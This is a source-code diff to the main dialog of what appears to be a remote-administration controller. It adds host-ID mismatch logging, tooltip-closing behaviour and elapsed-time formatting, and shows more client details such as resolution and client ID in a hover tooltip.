@@ -790,6 +790,10 @@ VOID CMy2015RemoteDlg::AddList(CString strIP, CString strAddr, CString strPCName
                                      v[RES_CLIENT_PUBIP].empty() ? strIP : v[RES_CLIENT_PUBIP].c_str(),
                                    };
     auto id = CONTEXT_OBJECT::CalculateID(data);
+    if (std::to_string(id) != v[RES_CLIENT_ID]) {
+        Mprintf("上线消息 - 主机ID错误: calc=%llu, recv=%s, IP=%s, Path=%s\n",
+                id, v[RES_CLIENT_ID].c_str(), strIP.GetString(), path.GetString());
+    }
     bool modify = false;
     CString loc = GetClientMapData(id, MAP_LOCATION);
     if (loc.IsEmpty()) {
@@ -1590,13 +1594,26 @@ void CMy2015RemoteDlg::OnTimer(UINT_PTR nIDEvent)
 }
 
 
-void CMy2015RemoteDlg::DeletePopupWindow()
+void CMy2015RemoteDlg::DeletePopupWindow(BOOL bForce)
 {
-    if (m_pFloatingTip) {
-        if (::IsWindow(m_pFloatingTip->GetSafeHwnd()))
-            m_pFloatingTip->DestroyWindow();
-        SAFE_DELETE(m_pFloatingTip);
+    if (!m_pFloatingTip)
+        return;
+
+    if (!bForce && ::IsWindow(m_pFloatingTip->GetSafeHwnd()))
+    {
+        CPoint pt;
+        GetCursorPos(&pt);
+        CRect rc;
+        m_pFloatingTip->GetWindowRect(&rc);
+
+        if (rc.PtInRect(pt))
+            return;  // 鼠标还在窗口上，继续等待
     }
+
+    if (::IsWindow(m_pFloatingTip->GetSafeHwnd()))
+        m_pFloatingTip->DestroyWindow();
+
+    SAFE_DELETE(m_pFloatingTip);
     KillTimer(TIMER_CLOSEWND);
 }
 
@@ -1612,7 +1629,7 @@ void CMy2015RemoteDlg::Release()
 {
     Mprintf("======> Release\n");
     UninitFileUpload();
-    DeletePopupWindow();
+    DeletePopupWindow(TRUE);
     isClosed = TRUE;
     m_frpStatus = STATUS_EXIT;
     ShowWindow(SW_HIDE);
@@ -3009,7 +3026,7 @@ BOOL CMy2015RemoteDlg::PreTranslateMessage(MSG* pMsg)
             CRect tipRect;
             ::GetWindowRect(hTipWnd, &tipRect);
             if (!tipRect.PtInRect(pt)) {
-                DeletePopupWindow();
+                DeletePopupWindow(TRUE);
             }
         }
     }
@@ -3538,6 +3555,40 @@ void CMy2015RemoteDlg::OnOnlineAuthorize()
     SendSelectedCommand(bToken, sizeof(bToken));
 }
 
+CString FormatValue(double dValue, LPCTSTR szUnit)
+{
+    CString str;
+    if (dValue == (int)dValue)
+        str.Format(_T("%d%s"), (int)dValue, szUnit);
+    else
+        str.Format(_T("%.1f%s"), dValue, szUnit);
+    return str;
+}
+
+CString GetElapsedTime(LPCTSTR szBaseTime)
+{
+    int nYear, nMonth, nDay, nHour, nMin, nSec;
+    if (_stscanf_s(szBaseTime, _T("%d-%d-%d %d:%d:%d"),
+        &nYear, &nMonth, &nDay, &nHour, &nMin, &nSec) != 6)
+    {
+        return _T("0s");
+    }
+
+    CTime tmBase(nYear, nMonth, nDay, nHour, nMin, nSec);
+    CTime tmNow = CTime::GetCurrentTime();
+    __int64 nSeconds = (tmNow - tmBase).GetTotalSeconds();
+    if (nSeconds < 0) nSeconds = -nSeconds;
+
+    if (nSeconds < 60)
+        return FormatValue((double)nSeconds, _T("s"));
+    else if (nSeconds < 3600)
+        return FormatValue(nSeconds / 60.0, _T("m"));
+    else if (nSeconds < 86400)
+        return FormatValue(nSeconds / 3600.0, _T("h"));
+    else
+        return FormatValue(nSeconds / 86400.0, _T("d"));
+}
+
 void CMy2015RemoteDlg::OnListClick(NMHDR* pNMHDR, LRESULT* pResult)
 {
     LPNMITEMACTIVATE pNMItem = (LPNMITEMACTIVATE)pNMHDR;
@@ -3558,24 +3609,24 @@ void CMy2015RemoteDlg::OnListClick(NMHDR* pNMHDR, LRESULT* pResult)
         CString strText;
         std::string expired = res[RES_EXPIRED_DATE];
         expired = expired.empty() ? "" : " Expired on " + expired;
-        strText.Format(_T("文件路径: %s%s %s\r\n系统信息: %s 位 %s 核心 %s GB\r\n启动信息: %s %s %s%s\r\n上线信息: %s %d %s"),
+        strText.Format(_T("文件路径: %s%s %s\r\n系统信息: %s 位 %s 核心 %s GB %s\r\n启动信息: %s %s %s%s %s\r\n上线信息: %s %d %s\r\n客户信息: %s"),
                        res[RES_PROGRAM_BITS].IsEmpty() ? "" : res[RES_PROGRAM_BITS] + " 位 ", res[RES_FILE_PATH], res[RES_EXE_VERSION],
-                       res[RES_SYSTEM_BITS], res[RES_SYSTEM_CPU], res[RES_SYSTEM_MEM], startTime, expired.c_str(),
-                       res[RES_USERNAME], res[RES_ISADMIN] == "1" ? "[管理员]" : res[RES_ISADMIN].IsEmpty() ? "" : "[非管理员]",
-                       ctx->GetProtocol().c_str(), ctx->GetServerPort(), typMap[type].c_str());
+                       res[RES_SYSTEM_BITS], res[RES_SYSTEM_CPU], res[RES_SYSTEM_MEM], res[RES_RESOLUTION], startTime, expired.c_str(),
+                       res[RES_USERNAME], res[RES_ISADMIN] == "1" ? "[管理员]" : res[RES_ISADMIN].IsEmpty() ? "" : "[非管理员]", GetElapsedTime(startTime),
+                       ctx->GetProtocol().c_str(), ctx->GetServerPort(), typMap[type].c_str(), res[RES_CLIENT_ID]);
 
         // 获取鼠标位置
         CPoint pt;
         GetCursorPos(&pt);
 
         // 清理旧提示
-        DeletePopupWindow();
+        DeletePopupWindow(TRUE);
 
         // 创建提示窗口
         m_pFloatingTip = new CWnd();
         int width = res[RES_FILE_PATH].GetLength() * 10 + 36;
         width = min(max(width, 360), 800);
-        CRect rect(pt.x, pt.y, pt.x + width, pt.y + 80); // 宽度、高度
+        CRect rect(pt.x, pt.y, pt.x + width, pt.y + 100); // 宽度、高度
 
         BOOL bOk = m_pFloatingTip->CreateEx(
                        WS_EX_TOPMOST | WS_EX_TOOLWINDOW | WS_EX_NOACTIVATE,
